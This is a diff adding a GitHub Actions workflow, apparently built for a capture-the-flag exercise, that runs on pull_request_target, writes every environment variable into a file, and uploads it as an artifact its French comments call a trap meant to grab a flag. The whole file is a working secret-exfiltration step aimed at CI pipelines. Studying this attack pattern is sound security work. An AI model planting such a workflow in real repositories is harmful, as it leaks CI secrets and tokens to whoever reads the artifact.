@@ -1,0 +1,21 @@
+name: Producer Workflow
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  build-malicious-artifact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 1. Créer un fichier contenant la charge utile (payload)
+        run: |
+          echo "Tentative de récupération du FLAG :" > payload.txt
+          # La charge utile qui cherche à lire les variables d'environnement
+          env >> payload.txt
+
+      - name: 2. Sauvegarder le fichier sous forme d'artefact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mon-artefact-piege
+          path: payload.txt
